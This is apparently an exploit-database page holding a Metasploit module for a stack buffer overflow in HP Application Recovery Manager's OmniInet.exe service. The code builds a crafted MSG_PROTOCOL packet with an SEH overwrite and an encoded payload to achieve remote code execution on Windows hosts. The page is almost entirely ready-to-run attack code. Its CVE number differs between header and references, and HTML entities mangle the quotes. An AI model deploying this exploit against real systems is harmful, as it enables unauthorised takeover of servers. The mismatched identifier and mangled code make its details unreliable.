HP Application Recovery Manager (OmniInet.exe) Buffer Overflow
==============================================================


# Title: HP Application Recovery Manager (OmniInet.exe) Buffer Overflow
# CVE-ID: (2009-3844)
# OSVDB-ID: (60852)
# Author: EgiX
# Published: 2009-12-26
# Verified: yes

view source
print?
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP Application Recovery Manager (OmniInet.exe) Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in HP Application Recovery Manager OmniInet daemon.
                    By sending a specially crafted MSG_PROTOCOL packet, a remote attacker may be able to execute arbitrary code.
            },
            &#039;Author&#039;         => &#039;EgiX <n0b0d13s[at]gmail.com>&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-3884&#039; ],
                    [ &#039;BID&#039;, &#039;37250&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-09-091&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039;    => 4658,
                    &#039;BadChars&#039; => &#039;\x00&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x004412ed } ], # OmniInet.exe pop ecx; pop ecx; ret
                ],
            &#039;DefaultTarget&#039;  => 0))
 
            register_options([Opt::RPORT(5555)], self.class)
 
    end
 
    def exploit
        connect
 
        off = payload_space + 8
        sep = "\x00\x00\x20\x00"
 
        buff =  "\x00\x00\x12\x67"                  # packet length
        buff << "\xff\xfe\x32\x00\x36\x00\x37\x00"    # MSG_PROTOCOL command
        buff << sep + rand_text_alpha_upper(2)
        buff << sep + rand_text_alpha_upper(2)
        buff << sep + rand_text_alpha_upper(2)
        buff << sep + rand_text_alpha_upper(2)
        buff << sep + payload.encoded + generate_seh_record(target.ret)
        # jump back to shellcode
        buff << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
        buff << sep
 
        print_status("Sending MSG_PROTOCOL packet")
        sock.put(buff)
 
        sleep(5)
        handler
        disconnect
    end
 
end



